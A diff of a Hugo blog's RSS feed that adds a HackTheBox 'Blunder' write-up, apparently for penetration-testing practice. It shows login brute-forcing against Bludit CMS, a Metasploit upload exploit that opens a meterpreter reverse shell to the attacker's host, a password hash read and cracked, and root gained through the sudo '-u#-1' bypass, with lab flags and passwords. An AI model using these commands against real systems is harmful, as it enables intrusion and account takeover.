@@ -6,8 +6,376 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 19 Sep 2020 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Fri, 02 Oct 2020 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://0xSh1v4.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HackTheBox- Blunder Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/10/hackthebox-blunder-writeup/</link>
+            <pubDate>Fri, 02 Oct 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/10/hackthebox-blunder-writeup/</guid>
+            <description>Machine IP : 10.10.10.191
+This following write up is for the machine: Blunder
+Hack the Box is an online CTF platform where you can hone your penetration testing skills. It’s similar to boot2root machines. The goal is to find two flags namely, User flag and Root flag to successfully root the machine.
+Synopsis Blunder is the easy boot2root machine where we need to find two flags in the machine. Enumeration is the key and this machines does require a bit of enumeration and exploiting the specific CMS version and then getting the initial foothold, later it becomes easy and escaltion to root is very simple could be done by popular SUDO exploit.</description>
+            <content type="html"><![CDATA[<p>Machine IP : 10.10.10.191</p>
+<p>This following write up is for the machine: Blunder</p>
+<p>Hack the Box is an online CTF platform where you can hone your penetration testing skills. It’s similar to boot2root machines. The goal is to find two flags namely, User flag and Root flag to successfully root the machine.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://app.hackthebox.eu/machines/254">Blunder</a> is the easy boot2root machine where we need to find two flags in the machine. Enumeration is the key and this machines does require a bit of enumeration and exploiting the specific CMS version and then getting the initial foothold, later it becomes easy and escaltion to root is very simple could be done by popular SUDO exploit.</p>
+<h2 id="scanning-and-enumeration-the-network">Scanning and Enumeration the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
+<h3 id="nmap-results">Nmap Results:</h3>
+<p>As usual I tried to run the scan with the following command.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/HTB/Blunder]
+└─$ nmap -sC -sV -oA top 10.10.10.191                     
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 11:13 CEST
+Nmap scan report for 10.10.10.191
+Host is up (0.083s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.82 seconds
+</code></pre><p>It seems FTP port is closed and we have only port 80 opened. Masscan confirmed the same.</p>
+<p>Lets check what is in the port 80.</p>
+<figure>
+    <img src="/HTB/Blunder/1.png"
+         alt="Tryhackme: Blunder machine - Webpage"/> <figcaption>
+            <p>Tryhackme: Blunder machine - Webpage</p>
+        </figcaption>
+</figure>
+
+<p>Som we have some kind of blog listed here.</p>
+<p>So, lets fire up the Dirb scan to check for any directories or files.</p>
+<h3 id="dirb-results">Dirb Results</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/HTB/Blunder]
+└─$ dirb http://10.10.10.191 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct  2 11:14:17 2020
+URL_BASE: http://10.10.10.191/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.191/ ----
++ http://10.10.10.191/0 (CODE:200|SIZE:7562)                                                                                                                                                                                                 
++ http://10.10.10.191/about (CODE:200|SIZE:3281)                                                                                                                                                                                             
+==&gt; DIRECTORY: http://10.10.10.191/admin/                                                                                                                                                                                                    
++ http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)                                                                                                                                                                                             
++ http://10.10.10.191/LICENSE (CODE:200|SIZE:1083)                                                                                                                                                                                           
++ http://10.10.10.191/robots.txt (CODE:200|SIZE:22)                                                                                                                                                                                          
++ http://10.10.10.191/server-status (CODE:403|SIZE:277)
+</code></pre><p>From the results, it shows that we have an admin page of bludit cms.<a href="https://www.bludit.com/">Bludit-CMS</a>
+<figure>
+    <img src="/HTB/Blunder/2.png"
+         alt="Tryhackme: Blunder machine - CMS-ADmin-Panel"/> <figcaption>
+            <p>Tryhackme: Blunder machine - CMS-ADmin-Panel</p>
+        </figcaption>
+</figure>
+</p>
+<p>Lets look for directory structure of bludit and I found this</p>
+<figure>
+    <img src="/HTB/Blunder/3.png"
+         alt="Tryhackme: Blunder machine - Metadata.json-Version-Exposure"/> <figcaption>
+            <p>Tryhackme: Blunder machine - Metadata.json-Version-Exposure</p>
+        </figcaption>
+</figure>
+
+<p>After looking for some publicly available exploits, I found this bruteforce of admin panel exploit <a href="https://www.exploit-db.com/exploits/48746">Bludit-Bruteforce</a></p>
+<p>So, lets try to bruteforce this and see, if we can get something.</p>
+<p>I don&rsquo;T know the username. So, i tried with admin. It doesn&rsquo;t work out. lets try to find the username.</p>
+<p>So, the dirb with the default wordlist doesn&rsquo;t help much. So, this time I have used common.txt from <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content">directory-list-2.3-medium.txt-seclist</a> using gobuster.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/HTB/Blunder]
+└─$ gobuster dir -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.191 -s 200 -x txt,php 
+/about (Status: 200)
+/0 (Status: 200)
+/test (Status: 200)
+/install.php (Status: 200)
+/robots.txt (Status: 200)
+/todo.txt (Status: 200)
+
+===============================================================
+2020/10/02 12:48:00 Finished
+===============================================================
+</code></pre><p>from  the results, we could see todo.txt file</p>
+<figure>
+    <img src="/HTB/Blunder/4.png"
+         alt="Tryhackme: Blunder machine - Todo.txt"/> <figcaption>
+            <p>Tryhackme: Blunder machine - Todo.txt</p>
+        </figcaption>
+</figure>
+
+<p>now, we got the username: Fergus</p>
+<h2 id="exploitation-of-the-machine">Exploitation of the machine</h2>
+<p>So, lets try to bruteforce the password with the wordlist rockyou.txt. But I haven&rsquo;t got any match from this.</p>
+<p>So, I tried to create the custom wordlist from the website using this tool <a href="https://tools.kali.org/password-attacks/cewl">CEWL</a></p>
+<pre><code>zeus㉿Zeus-Master)-[/mnt/…/PenTest/HTB/Blunder/Bludit-auth-BF-bypass]
+└─$ ruby exploit.rb -r http://10.10.10.191 -u fergus -w bludit_custom.txt
+Trying password: written
+[*] Trying password: approximately
+[*] Trying password: short
+[*] Trying password: stories
+[*] Trying password: book
+[*] Trying password: collections
+[*] Trying password: Bram
+[*] Trying password: Stoker
+[*] Trying password: British
+[*] Trying password: Society
+[*] Trying password: Book
+[*] Trying password: him
+[*] Trying password: Distinguished
+[*] Trying password: Contribution
+[*] Trying password: Letters
+[*] Trying password: probably
+[*] Trying password: best
+[*] Trying password: fictional
+[*] Trying password: character
+[*] Trying password: RolandDeschain
+Password found: RolandDeschain
+
+</code></pre><p>After few mins, we got a hit with the password.</p>
+<p>Now, we have logged into the machine.
+<figure>
+    <img src="/HTB/Blunder/5.png"
+         alt="Tryhackme: Blunder machine - LoggedinWebpage"/> <figcaption>
+            <p>Tryhackme: Blunder machine - LoggedinWebpage</p>
+        </figcaption>
+</figure>
+</p>
+<p>we also found other exploits which works if we have username and password. <a href="https://www.exploit-db.com/exploits/47699">https://www.exploit-db.com/exploits/47699</a></p>
+<p>lets try to use the remote code execution module from metasploit.</p>
+<pre><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show options
+
+Module options (exploit/linux/http/bludit_upload_images_exec):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   BLUDITPASS  RolandDeschain   yes       The password for Bludit
+   BLUDITUSER  fergus           yes       The username for Bludit
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The base path for Bludit
+   VHOST                        no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.71      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Bludit v3.9.2
+
+
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.71:4444 
+[+] Logged in as: fergus
+[*] Retrieving UUID...
+[*] Uploading qqpGqteaZj.png...
+[*] Uploading .htaccess...
+[*] Executing qqpGqteaZj.png...
+[*] Sending stage (38288 bytes) to 10.10.10.191
+[*] Meterpreter session 1 opened (10.10.14.71:4444 -&gt; 10.10.10.191:60214) at 2020-10-02 13:41:50 +0200
+[+] Deleted .htaccess
+
+meterpreter &gt; shell
+Process 29096 created.
+Channel 0 created.
+ls
+10.10.14.195:1122
+temp
+thumbnails
+python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
+</code></pre><p>So, now we got the low level shell.
+further enumerating, we ended up with this.</p>
+<pre><code>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home 
+cd /home
+www-data@blunder:/home$ ls
+ls
+hugo  shaun
+www-data@blunder:/home$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root  root  4096 Apr 27 14:31 .
+drwxr-xr-x 21 root  root  4096 Apr 27 14:09 ..
+drwxr-xr-x 17 hugo  hugo  4096 Oct  2 12:46 hugo
+drwxr-xr-x 16 shaun shaun 4096 Apr 28 12:13 shaun
+www-data@blunder:/home$ cd hugo
+cd hugo
+www-data@blunder:/home/hugo$ ls
+ls
+10.10.14.195:1122  Documents  Music	Public	    Templates  user.txt
+Desktop		   Downloads  Pictures	REPORT.TXT  Videos
+www-data@blunder:/home/hugo$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@blunder:/home/hugo$ cat REPORT.txt
+cat REPORT.txt
+cat: REPORT.txt: No such file or directory
+www-data@blunder:/home/hugo$ ls -la
+ls -la
+total 208
+drwxr-xr-x 17 hugo hugo   4096 Oct  2 12:46 .
+drwxr-xr-x  4 root root   4096 Apr 27 14:31 ..
+lrwxrwxrwx  1 root root      9 Apr 28 12:13 .bash_history -&gt; /dev/null
+-rw-r--r--  1 hugo hugo    220 Nov 28  2019 .bash_logout
+-rw-r--r--  1 hugo hugo   3771 Nov 28  2019 .bashrc
+drwx------ 13 hugo hugo   4096 Apr 27 14:29 .cache
+drwx------ 11 hugo hugo   4096 Nov 28  2019 .config
+drwx------  3 hugo hugo   4096 Apr 27 14:30 .gnupg
+drwxrwxr-x  3 hugo hugo   4096 Nov 28  2019 .local
+drwx------  5 hugo hugo   4096 Apr 27 14:29 .mozilla
+-rw-r--r--  1 hugo hugo    807 Nov 28  2019 .profile
+drwx------  2 hugo hugo   4096 Apr 27 14:30 .ssh
+drwxrwxr-x  3 hugo hugo   4096 Oct  2 12:42 10.10.14.195:1122
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Desktop
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Documents
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Downloads
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Music
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Pictures
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Public
+-rw-rw-r--  1 hugo hugo 126106 Oct  2 12:40 REPORT.TXT
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Templates
+drwxr-xr-x  2 hugo hugo   4096 Nov 28  2019 Videos
+-r--------  1 hugo hugo     33 Oct  2 09:27 user.txt
+www-data@blunder:/home/hugo$ cd ..
+cd ..
+www-data@blunder:/home$ ls
+ls
+hugo  shaun
+www-data@blunder:/home$ cd shaun
+cd shaun
+www-data@blunder:/home/shaun$ ls
+ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
+</code></pre><p>So, there are two users in the machine hugo and shaun.</p>
+<p>AFter enumerating a while, I found the hashes inside users.php file from /var/www folder location.</p>
+<pre><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
+ls
+categories.php	plugins       site.php	  tags.php
+pages.php	security.php  syslog.php  users.php
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+cat users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca{REDACTED}c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+</code></pre><p>Now, we got the hash for the user hugo. lets crack it.</p>
+<figure>
+    <img src="/HTB/Blunder/6.png"
+         alt="Tryhackme: Blunder machine - Sha1 cracked"/> <figcaption>
+            <p>Tryhackme: Blunder machine - Sha1 cracked</p>
+        </figcaption>
+</figure>
+
+<p>now we got the password. lets login to hugo.</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>Now, we have logged into the machine as hugo user.</p>
+<pre><code>hugo@blunder:/var/www/bludit-3.9.2/bl-content/databases$ whoami
+whoami
+hugo
+hugo@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cd /home/hugo
+cd /home/hugo
+hugo@blunder:~$ ls
+ls
+10.10.14.195:1122  Documents  Music     Public      Templates  Videos
+Desktop            Downloads  Pictures  report.txt  user.txt
+hugo@blunder:~$ cat user.txt
+cat user.txt
+f6d92a8eb883b93202d00f1e807a962d
+
+</code></pre><p>now we got the user flag.</p>
+<h2 id="post--exploitation">Post- exploitation</h2>
+<p>So, lets enumerate the machine. So, i have tried sudo -l and immediately, we got the answer and solution to get to the root.</p>
+<p>Once, I saw this, I know at once its <strong>CVE-2019-14287</strong>, SUDO flaw which allows the users to run command even in the restricted access.</p>
+<p>since, bash was allowed to run. we just type.
+<code>sudo -u#-1 bash -u</code></p>
+<pre><code>hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$ sudo bash
+sudo bash
+Sorry, user hugo is not allowed to execute '/usr/bin/bash' as root on blunder.
+hugo@blunder:~$ sudo -u#-1 bash -u
+sudo -u#-1 bash -u
+bash: SUDO_PS1: unbound variable
+bash-5.0# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+bash-5.0# cd /root/    
+cd /root/
+bash-5.0# ls
+ls
+root.txt
+bash-5.0# cat root.txt
+cat root.txt
+0f9e42d31dd773a27030283f7c4bd8af
+</code></pre><p>And thats how we got the root access in this machine. Enumeration, weak hash and sudo configurations were exploited in this machine.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
         
         <item>
             <title>Tryhackme- Brooklyn-99 Writeup</title>
